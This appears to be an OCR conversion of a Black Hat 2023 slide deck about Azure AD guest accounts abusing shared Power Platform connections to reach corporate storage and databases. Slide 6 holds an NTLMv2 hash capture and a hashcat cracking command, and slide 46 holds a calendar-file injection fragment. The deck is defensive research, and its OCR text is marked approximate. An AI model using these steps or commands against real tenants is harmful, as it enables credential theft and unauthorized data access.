---
title: "All You Need is Guest"
speakers: ["Michael Bargury"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/Michael Bargury_All You Need is Guest.pdf"
pages: 200
sha256: "8c407927e0d1d85bce6f156d4d2d03dbf1539124cb2f9229e3c7f56e8b10936c"
text_chars: 83946
ocr_pages: 111
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.4
ocr_unreliable_blocks: 0
vision_verified_blocks: 7
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:18:42Z"
---
# All You Need is Guest

**Speakers:** Michael Bargury  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/Michael Bargury_All You Need is Guest.pdf` (200 pages)


## Slide 1

# All You Need Is Guest

Michael Bargury @mbrg0 Zenity

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
AUGUST 9-10, ©0253
BRIEFINGS
All You Need Is Guest
Michael Bargury @mbrgO
Zenity
#BHUSA @BlackHatEvents
```

## Slide 2

# DEMO

@mbrg0

#BHUSA @BlackHatEvents

## Slide 3

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
g Zenity Demo invited you to access applications within their organization ‘External @ @
* © Microsoft Invitations on behalf of Zenity Demo <invites@microsoft.con F 28, 4:32PM (6 day ) a)
© Feat) to | ker6, me +
> @ Please only act on this email if you trust the organization represented below. In rare cases, individuals may receive
fraudulent invitations from bad actors posing as legitimate companies. If you were not expecting this invitation, proceed
ny? with caution
v
Organization: Zenity Demo
an Domain: zenitydemo.onmicro
e
e
If you accept this invitation, you'll be sent to https://myapplications .microsoft.com/?tenantid=fc993b0f-345b-4d01-9f67-
»
» Accept invitat
. Block future invitations from this organization
e This invitation email is from Zenity Demo (Zenitydemo.onmicrosoft.com) and may include advertising content
Zenity Demo has not provided a link to their privacy statement for you to review. Microsoft Corporation facilitated
sending this email but did not validate the sender or the message.
```

## Slide 4

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
My Apps
Apps ; Zenity Demo oa
This is unavailable due to your
account permissions and Hacker5
company's settings
hackerS@pwnt nmicr
> } Signin with a different a
```

## Slide 5

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
powerpwn - Credentials
All Resources
Credentials
Automations
Applications
Connectors
Connector Connection Created by
© = shared _azureblob https://enterpriseip.blob.core.windows.net/patentarchive jamier@zenitydemo.onmicrosoft.com
shared azuretables jamieredingcustomerdata.table.core.windows.net/customers jamier@zenitydemo.onmicrosoft.com
shared azurequeues Azure Queues jamier@zenitydemo.onmicrosoft.com
B shared sql enterprisefinancial financialreports.database.windows.net hi@pwntoso.onmicrosoft.com
customercareinsights.database.windows.net
Playground Raw
Dump
Playground Raw
Dump
Playground Raw
Dump
Playground Raw
Dump
Playground Raw
Dump
Playg
```

## Slide 6

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 70/100 on the text kept, 62/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
INTRO    CASE STUDIES    ATTACKS    DEFENCE    AUTOMATION

Desktop Credential Compromise

[left panel - Responder SMB output]
[SMB] NTLMv2-SSP Client   : 192.168.18.129
[SMB] NTLMv2-SSP Username : .\User
[SMB] NTLMv2-SSP Hash     : User::.:62ec61be6fd3f441:7[obscured]
8271E:01010000000000008067A3DAB3FBD90162BC599FA75E807A[obscured]
00510001001E00570049004E002D0054004400530054004D003700[obscured]
00570049004E002D0054004400530054004D003700460041005400[obscured]
002E004C004F00430041004C00030014004A004300470051002E00[obscured]
004A004300470051002E004C004F00430041004C00070008008067[obscured]

[right panel - hashcat console]
PS C:\Users\User\Desktop\hashcat-6.1.1> .\hashcat.exe -a 0 -m 5600 .\hash.txt .\rockyou.txt -w 3 -O
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 2.1 AMD-APP (3516.0)) - Platform #1 [Advanced Micro Devices, Inc.]
====================================================================================
* Device #1: Ellesmere, 8128/8192 MB (6745 MB allocatable), 32MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 626 MB

Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14345042
* Bytes.....: 139927340
* Keyspace..: 14345042

USER::.:62ec61be6fd3f441:7fad17e80b2bb6146ede37a40548271e:01010000000000008067a3dab3fbd90162bc599fa[obscured]
2d0054004400530054004d00370046004100540049004c0004003400570049004e002d0054004400530054004d003700460[obscured]
00030014004a004300470051002e004c004f00430041004c00050014004a004300470051002e004c004f00430041004c000[obscured]
00000100000000200000a74a588690d6960504aa1d55f090070980ea44ea46155bbe709a8c885673a3f60a0010000000000[obscured]
0032002e003100360038002e00310038002e00310032003800000000000000000000:Password1
```

## Slide 7

## Hi there👋

- CTO and Co-founder @ Zenity

- • OWASP LCNC Top 10 project lead

- • Dark Reading columnist

- Defcon, BSides, RSAC, OWASP

- Hiring top researchers, engs & pms!

   - @mbrg0 github.com/mbrg darkreading.com/author/michael-bargury

#BHUSA @BlackHatEvents

## Slide 8

# WHY invite guests in?

@mbrg0

#BHUSA @BlackHatEvents

## Slide 9

## How can two parties collaborate over a bunch of files?

F1000 enterprise

Small vendor

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
How can two parties collaborate over a
bunch of files?
POC Kickoff
F1000
enterprise
Small
vendor
NDA
Success Criteria
Order Form
POC Agenda
```

## Slide 10

## Option 1: just email sensitive files around

#BHUSA @BlackHatEvents

## Slide 11

## Option 2: trust a rando on the internet

#BHUSA @BlackHatEvents

## Slide 12

## Option 2: trust a rando IRL

Source: deaddrops.com

#BHUSA @BlackHatEvents

## Slide 13

## Option 3: invite them in

Azure AD

F1000 tenant

#BHUSA @BlackHatEvents

## Slide 14

## Option 3: invite them in

_“external users can "bring their own identities." ... and you manage access to your apps … to keep your resources protected.“_

Azure AD

F1000 tenant

#BHUSA @BlackHatEvents

## Slide 15

## Safe guest access must be: (a)Easy for vendo rs to onboard

#BHUSA @BlackHatEvents

## Slide 16

## Safe guest access must be:

(a)Easy for vendo rs to onboard (b)Easy for IT/security to control

#BHUSA @BlackHatEvents

## Slide 17

## Safe guest access must be:

(a)Easy for vendo rs to onboard (b)Easy for IT/security to control

#BHUSA @BlackHatEvents

## Slide 18

## (a) It’s super easy to get a guest account

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
© excel | Microsoft 365 +) Chat| Microsoft Teams Xp SharePoint @ Home - OneDrive @ Home - Microsoft Entra admin c | tt Yammer - Feed
Establishing secure connection.
13/07/2023 ™
```

## Slide 19

## (a) It’s super easy to get a guest account

Source: @_dirkjan at BHUSA 2022

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HJ M invited you to access applications within their organization
o Microsoft Invitations on behalf of iminyourcloud <invites@microsoft.com>
To: Invite Me
@ Please only act on this email if you trust the individual and organization represented below. In rare cas
individuals may receive fraudulent invitations from bad actors posing as legitimate companies. If you were not
expecting this invitation, proceed with caution.
Sender: HJ M jan¢
Organization: iminyourcloud
Domain: [iminyour.cloud]iminyour.cloud
If you accept this invitation, you'll be sent to htt
antid
from this organization.
This invitation email is from iminyourcloud ([iminyour.cloud]iminyour.cloud) and may include advertising
content. iminyourcloud has not provided a link to their privacy statement for you to review. Microsoft
Corporation facilitated sending this email but did not validate the sender or the message.
Microsoft respects your privacy. To learn more, please read the Microsoft Privacy Statement.
Microsoft Corporation, One Microsoft Way, Redmond, WA 98052
Source: @_dirkjan at
BHUSA 2022
S Reply ? Forward
```

## Slide 20

## (a) It’s super easy to get a guest account

## Perhaps too easy?

Source: @_dirkjan at BHUSA 2022 * Vulns were fixed.

#BHUSA @BlackHatEvents

## Slide 21

## (a) It’s super easy to get a guest account

## Perhaps too easy?

Source: @_dirkjan at BHUSA 2022

* Vulns were fixed.

#BHUSA @BlackHatEvents

## Slide 22

## (a) It’s super easy to get a guest account

## Perhaps too easy?

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
(a) It’s
super easy Perhaps too easy?
to geta PS
account
Dirk-jan Mollema / @_dirkjan
```

## Slide 23

## Safe guest access must be:

(a)Easy for vendo rs to onboard (b)Easy for IT/security to control

#BHUSA @BlackHatEvents

## Slide 24

## (b) Understanding how control works

Azure AD

Partners, vendors, suppliers, other collaborators

F1000 tenant

#BHUSA @BlackHatEvents

## Slide 25

## (b) Understanding how control works

Partners, vendors, suppliers, other collaborators

linked

Azure AD

F1000 tenant

#BHUSA @BlackHatEvents

## Slide 26

## (b) Control guests like employees

linked Azure AD

Enterprise controls to ensure secure access: MFA, RBAC, CA, device attestation, threat monitoring …

#BHUSA @BlackHatEvents

## Slide 27

## (b) Applying security controls to guests

Need guest access ➔ Require security controls

#BHUSA @BlackHatEvents

## Slide 28

## (b) Applying security controls to guests

Need guest access ➔ Require security controls Security controls ➔ Require AAD account

#BHUSA @BlackHatEvents

## Slide 29

## (b) Applying security controls to guests

Need guest access ➔ Require security controls Security controls ➔ Require AAD account

AAD account ➔ Grants full access

_Q.E.D. …?_

#BHUSA @BlackHatEvents

## Slide 30

## (b) Applying security controls to guests

Need guest access ➔ Require security controls Security controls ➔ Require AAD account AAD account ➔ Grants ~~full~~ **deny-by-default** access

#BHUSA @BlackHatEvents

## Slide 31

## AAD guests recap

- It’s super easy to get a guest account

- • AAD security controls apply

- Access is deny-by-default

#BHUSA @BlackHatEvents

## Slide 32

# Guest accounts in practice

Insert expectation vs reality meme

@mbrg0

#BHUSA @BlackHatEvents

## Slide 33

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vendor onboarding
© Your teams
Chat
coe Vendor onboarding a Members Pending Requests Channels Settings Analytics Apps Tags
Teams This team has guests.
diane Search for members Q & Add member
Calls
Name Title Location Tags @ Role
Files
au Greg Winston VP of IT Owner Vv
>» Members and guests (2)
oo
oo
Apps
Help
```

## Slide 34

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Add members to Vendor onboarding
Start typing a name, distribution list, or security group to add to your team. You can
also add people outside your organization as guests by typing their email addresses.
Ktart typing a name or group
```

## Slide 35

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Add members to Vendor onboarding
Start typing a name, distribution list, or security group to add to your team. You can
also add people outside your organization as guests by typing their email addresses.
hacker5@pwntoso.onmicrosoft.com|
o__ Add hacker5@pwntoso.onmicrosoft.com as a
<e guest
```

## Slide 36

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Add members to Vendor onboarding
Start typing a name, distribution list, or security group to add to your team. You can
also add people outside your organization as guests by typing their email addresses.
Start typing a name or group
hacker5 (Guest)
H This person has been added, but it might take a while for them to show up in x
your member list.
```

## Slide 37

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
Sign in
hacker5@pwntoso.onmicrosoft.com
No account? Create one!
Can't access your account?
Back Next
Q Sign-in options
```

## Slide 38

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
Permissions requested by:
Zenity Demo
zenitydemo.onmicrosoft.com
By accepting, you allow this organization to:
\v_ Receive your profile data
\v Collect and log your activity
\v__ Use your profile data and activity data
You should only accept if you trust Zenity Demo. Zenity Demo
has not provided links to their terms for you to review. You
can update these permissions at
https://myaccount.microsoft.com/organizations.
Learn more
This resource is not shared by Microsoft.
```

## Slide 39

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
My Apps v P& Search apps ea 2 H
Apps x Zenity Demo Sign out
Apps dashboard A
This is unavailable due to your
account permissions and Hacker5
company's settings A
H hackerS5@pwntoso.onmicroso...
View accoun
Switch organization
Sign in with a different account
```

## Slide 40

## Guest exploitation state of the art

#BHUSA @BlackHatEvents

## Slide 41

## Guest exploitation state of the art

## 1. Phishing via Teams

@DrAzureAD at youtube.com/watch?v=NN1nIbp-z70

#BHUSA @BlackHatEvents

## Slide 42

## Guest exploitation state of the art

## 1. Phishing via Teams 2. Directory recon

@DrAzureAD at aadinternals.com/post/quest_for_guest/

#BHUSA @BlackHatEvents

## Slide 43

State of the art ends here. But hackers want more!

Can we access company data? Edit or delete data? Perform operations?

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 44

_https://make.power apps.com/environm ents/Defaultfc993b0f-345b4d01-9f679ac4a140dd43/con nections_

Go have an early lunch

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 45

#BHUSA @BlackHatEvents

## Slide 46

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 93/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
BEGIN:VCALENDAR
PRODID:-//caldav.icloud.com//CALDAVJ 2116B554//EN
VERSION:2.0
BEGIN:VEVENT
DTEND;TZID=Europe/London:202009[obscured]
ORGANIZER;CN=[obscured];EMAIL=[obscured]@icloud.com:[obscured]
[obscured]/principal/
UID:[obscured]
DTSTAMP:202103[obscured]
LOCATION:Home
SEQUENCE:1
SUMMARY:Meeting
LAST-MODIFIED:[obscured]
DTSTART;TZID=Europe/London:202009[obscured]
CREATED:202103[obscured]
ATTENDEE;CN=[obscured];CUTYPE=INDIVIDUAL;PARTSTAT=ACCEPTED;ROLE=CHAIR;
 EMAIL=[obscured]@icloud.com:[obscured]
[obscured]/principal/
DESCRIPTION]]>:x
ATTENDEE;EMAIL=[obscured];CN=[obscured]:[obscured]
[obscured]/principal/
ATTENDEE<![CDATA[:Notes
```

## Slide 47

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
B+ ®
Power Apps
Home
Create
Learn
Apps
Tables
Flows
Solutions
More
Power Platform
Welcome, Hacker5!
Ways to create an app
Start with data Start with a page design
6 Create a table, pick an existing one, or even import from Excel to faa Select from a list of different designs and layouts to get your
create an app app going.
Your apps
P Name Modified | Owner
& Package Management View : 1 month ago SYSTEM
Solution Health Hub : ly
See more apps >
Learning for every level see all
Create apps that connect to data, and work across web and mobile.
Environment
Pwntoso (default)
& Try the new Power Apps
Start with an app template
=>
Select from a list of fully-functional business app templates. Use
as-is or customize to suit your needs.
Type
Model-driven
Model.
Get started with Power Apps Author a basic formula to change properties in Work with external data in a Power Apps
mn) a canvas app canvas app
Beginner 51 min Beginner 42 min Intermediate
Manage and share apps in Powe|
Beginner
```

## Slide 48

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment
v Welcome, Hacker5!
+ Create
Create apps that connect to data, and work across web and mobile.
Learn
ce Apps
EB Tables
Ways to create an app
Flows
XY) Solutions Start with data Start with a page design Start with an app template
6 Create a table, pick an existing one, or even import from Excel to faa Select from a list of different designs and layouts to get your =) Select from a list of fully-functional business app templates. Use
More create an app app going. as-is or customize to suit your needs.
e Power Platform
Your apps
P Name Modified | Owner Type
Ba Package Management View : 1 month ago SYSTEM Model-driven
a Solution Health Hub : ly
SYSTEM Model
See more apps >
Learning for every level see all
Get started with Power Apps Author a basic formula to change properties in Work with external data in a Power Apps Manage and share apps in Powe|
a canvas app canvas app
Beginner 51 min Beginner 42 min Intermediate Thr 4 min Beginner
```

## Slide 49

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment
Power Apps & pwntoso (default)
y + Pwntoso Sign out
Welcome, Hacker5!
+ Create
Create apps that connect to data, and work across web and mobile. 7
Learn Hacker5
FP Apps hacker5@pwntoso.onmicroso...
View account
ays to create ana
y PP Switch directory
Flows
XY) Solutions Start with data Start with a page design —. Starcwitrrarrapptemprate
6 Create a table, pick an existing one, or even import from Excel to faa Select from a list of different designs and layouts to get your Select from a list of fully-functional business app templates. Use
* More create an app app going. as-is or customize to suit your needs.
e Power Platform
Your apps
P Name Modified | Owner Type
a Package Management View : 1 month ago SYSTEM Model-driven
a Solution Health Hub : 1 year ago SYSTEM Model-driven
See more apps >
Learning for every level see all
Get started with Power Apps
Author a basic formula to change properties in Work with external data in a Power Apps Manage and share apps in Powe|
a canvas app canvas app
Beginner 42 min Intermediate Thr 4 min Beginner
Beginner 51 min
```

## Slide 50

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment
& Try the new Power Apps
| fm Home a
. Welcome, Hacker5!
Create
Create apps that connect to data, and work across web and mobile.
aia Settings Directories
— Tables Directories ©
Ways to create an app Language and time y you choose will imr s that are avail he
Plas Notifications
NI Solutions Start with data Directories pumnicea tt with an app template
Create a table, pick an exist) ict from a list of fully-functional business app templates. Use
~ More create an app. All Directories 5 or customize to suit your needs.
€ Power Platform a”
Your apps Name Domain Directory ID
Name Zenity Demo Switch zenit 4
a Package Management View
Solution Health Hub
See more apps >
Learning for every level se
Get started with Power Ap Manage and share apps in Powe|
Beginner 51min i al 42 min Ww intermediate Thr4 min Beginner
```

## Slide 51

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment
— ! New connection Pp Search
fy Home . . .
Connections in Zenity Demo (default)
+ Create
LU) Learn
EP NEE Name Modified Status
fA Tables @| https://enterpriseip.blob.core.windows.net/patentarchive 11 min ago Connected
Azure Blob Storage
jamieredingcustomerdata file.core.windows.net 10 min ago Connected
Al, solutions Azure File Storage
| s) Connections a fr) nonceeuee 3 wk ago Connected
e Power Platform
enterprisefinancial financialreports.database.windows.n... 20 min ago Connected
SQL Server
| enterprisecustomers customercareinsights.database.wi... 2 wk ago Connected
SQL Server
```

## Slide 52

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
- Environment
— ! New connection L Edit \@ Share | Delete @ Details
fn} Home . . .
Connections in Zenity Demo (default)
{ Create
() Learn
oe Apps Name Modified Status
u
(-) jamieredingcustomerdata file.core.windows.net 12 min ago connected
All solutions Azure File Storage
| & Connections aA iia) mae uses 3 wk ago Connected
jamieredingcustomerdata.table.core.windows.net/cust... 16 min ago Connected
Azure Table Storage
€& Power Platform
enterprisefinancial financialreports.database.windows.n... 22 min ago Connected
SQL Server
enterprisecustomers customercareinsights.database.wi... 2 wk ago Connected
SQL Server
```

## Slide 53

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
— | New connection gO Edit \@ Share i] Delete @ Details
{ny Home . . .
Connections in Zenity Demo (default)
! Create
oe AGRE Name Modified Status
f# Tables @| https://enterpriseip.blob.core.windows.net/patentarchive 14 min ago Connected
Azure Blob Storage
rv) jamieredingcustomerdata file.core.windows.net 13 min ago Connected
All solutions Azure File Storage
| % Connections A i Azure Queues Connected
Azure Queues \@ Share
jamieredingcustomerdata.table.core.windows.net/cust... elete Connected
Azure Table Storage
€ Power Platform © Details
| enterprisefinancial financialreports.database.windows.n... 33 min ago Connected
SQL Server
a enterprisecustomers customercareinsights.database.wi... 2 wk ago Connected
SQL Server
```

## Slide 54

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Share jamieredingcustomerdata.file.core.windows.net
Enter nan ail addr
Shared with
Name
‘cy Shared with org
Q Jamie Reding
Q jamiercontoso
incipal name
jamier@zenitydemo.on...
jamiercontoso@outlook....
principal app Id
Permission Q)
Can use \ [x]
Owner
```

## Slide 55

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Share jamieredingcustomerdata.file.core.windows.net
Enter names, email add
Shared with
Name
6:9) Shared with org
amie Reding
Jser groups, service principa names
Or se
ce principal app Ic
```

## Slide 56

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
- Environment
— ! New connection gO Edit \@ Share [ii] Delete @ Details
fy Home . . .
Connections in Zenity Demo (default)
{ Create
oe ABDE Name Modified Status
&3 Tables @| https://enterpriseip.blob.core.windows.net/patentarchive 19 min ago Connected
Azure Blob Storage
() jamieredingcustomerdata.file.core.windows.net 18 min ago Connected
All solutions . Azure File Storage
Connections a Azure Queues C ted
jamieredingcustomerdata.table.core.windows.net/cust... elete Connected
Azure Table Storage
€& Power Platform © Details
enterprisefinancial financialreports.database.windows.n... 28 min ago Connected
SQL Server
Ba enterprisecustomers customercareinsights.database.wi... 2 wk ago Connected
SQL Server
```

## Slide 57

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
— £ Edit \@ Share Ill] Delete
Connections > jamieredingcustomerdata.file.core.windows.net
| Create
( Learn Details Apps using this connection Flows using this connection
EP Apps Connector name
Azure File Storage
Description
Microsoft Azure Storage provides a massively scalable, dur
AX] Solutions
| % Connections +
More Status
Connected
€ Power Platform
Owner
Jamie Reding
Created
7/6/2023, 2:30:34 PM
Modified
7/2023, 11:48:49 PM
```

## Slide 58

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
— £ Edit \@ Share Ill] Delete
Connections > jamieredingcustomerdata.file.core.windows.net
| Create
( Learn Details Apps using this connection Flows using this connection
EP Apps Connector name
Azure File Storage
Description
Microsoft Azure Storage provides a massively scalable, durat
AX] Solutions
| % Connections +
More
€ Power Platform
Owner
Jamie Reding
Created
7/6/2023, 2:30:34 PM
Modified
7/27/2023, 11:48:49 PM
```

## Slide 59

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Apps
Home
+ ®
Create
B
Learn
Apps
Tables
Flows
AX] Solutions
| ts) Connections A
More
€ Power Platform
L Edit \@ Share
Ty Delete
Connections > jamieredingcustomerdata.file.core.windows.net
Details Apps using this connection Flows using this connection
Connector name
El Azure File Storage
Description
ilable storage
ions.
t and delete
Status
Connected
Owner
Jamie Reding
Created
023, 2:30:34 PM
Modified
7/27/2023, 11:48:49 PM
Environment
& Zenity Demo (default)
Jamie Reding
(=)
@® Offline + Free all day
© 9:44 AM - Same time zone as you
Contact
Reports to >
4 $, William Contoso
Chief Operations Officer
```

## Slide 60

Business users are building their own apps w/ lowcode/no-code + GenAI

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 61

## Is this actually being used?

**_Credential Sharing as a Service: The Dark Side of No Code_**

Michael Bargury RSAC 2023

#BHUSA @BlackHatEvents

## Slide 62

## ~8M active Power devs today!

**_Credential Sharing as a Service: The Dark Side of No Code_**

Michael Bargury RSAC 2023

#BHUSA @BlackHatEvents

## Slide 63

# Exploit

@mbrg0

#BHUSA @BlackHatEvents

## Slide 64

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
— £ Edit \@ Share Ill] Delete
Connections > jamieredingcustomerdata.file.core.windows.net
| Create
( Learn Details Apps using this connection Flows using this connection
EP Apps Connector name
Azure File Storage
Description
Microsoft Azure Storage provides a massively scalable, dur
AX] Solutions
| % Connections +
More Status
Connected
€ Power Platform
Owner
Jamie Reding
Created
7/6/2023, 2:30:34 PM
Modified
7/2023, 11:48:49 PM
```

## Slide 65

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
— £ Edit \@ Share Ill] Delete 2 Search
Connections > jamieredingcustomerdata.file.core.windows.net
{ Create
[ Learn Details Apps using this connection Flows using this connection
FP Apps
Name
fH Tables
o/” Flows Customer Insights Azure
Solutions
| & Connections +
More
€& Power Platform
```

## Slide 66

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
- Environment
= £ Edit \@ Share Ill] Delete PD Search
Connections > jamieredingcustomerdata.file.core.windows.net
+ Create
© tearn Details Apps using this connection Flows using this connection
PF Apps
Name
o/” Flows Customer Insights Azure
| Solutions
| & Connections +a
More
€& Power Platform
```

## Slide 67

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Apps > Customer Insights Azure
! Create
Details Versions Connections Flows
Owner
| Apps Jamie Reding
Description
& Tables Not provided
o/” Flows Created
7 23, 11:49:44 PM
| Solutions
Modified
More 7/
€& Power Platform web link
9ac4a140dd43
Mobile QR code
```

## Slide 68

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 97/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Apps |
You need a Power Apps plan
```

## Slide 69

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 97/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Apps |
You need a Power Apps plan
```

## Slide 70

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Apps |
You need a Power Apps plan
= a licens at allows sé the
al for a pren cense or ask your admin
5
```

## Slide 71

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Signin Try free for 30 days
Announcing new conversational Al features in Power Apps, including generative Al bots for your apps >
Power Apps
Developer Plan
Build and test Power Apps for free
Get started free >
| Existing user? Add a dev environment >
Free for development and testing
Create apps and flows without writing code
with full-featured Power Apps and Power
Automate development tools. Easily share
and collaborate with others.
Developer-friendly
Connect to data sources, including Azure,
Dynamics 365, and custom APIs, with
premium connectors. Create additional
environments to exercise application lifecycle
management and CI/CD.
Dataverse included
Save time with a fully managed, scalable,
Azure-backed data platform, including
support for common business app actions.
Use out-of-the-box common tables or easily
build your own data schema.
```

## Slide 72

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
You've selected Microsoft Power Apps for Developer
(1) Let's get you started
Enter your work or school email address, we'll check if you need to create a new
account for Microsoft Power Apps for Developer.
Email
The Developer Plan makes it easy for
anyone to build and test apps with user-
hacker5 @pwntoso.onmicrosoft.com|
By proceeding you acknowledge that if you use your organization's email, your friendly low-code tools — for free.
organization may have rights to access and manage your data and account. Including, ongoing free access to:
Learn More
© Online learning resources and tutorials
Next
Microsoft Power Apps
Microsoft Dataverse
2) Create your account
More than 600 pre-built connectors
3.) Confirmation details
```

## Slide 73

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
You've selected Microsoft Power Apps for Developer
1) Let's get you started
2.) Create your account
GB) Confirmation details The Developer Plan makes it easy for
anyone to build and test apps with user-
Thanks for signing up for Microsoft Power Apps for Developer friendly low-code tools — for free.
Your username is hacker5@pwntoso.onmicrosoft.com Including, ongoing free access to:
¢ Online learning resources and tutorials
|
¢ Microsoft Power Apps
e Microsoft Dataverse
¢ More than 600 pre-built connectors
```

## Slide 74

#BHUSA @BlackHatEvents

## Slide 75

#BHUSA @BlackHatEvents


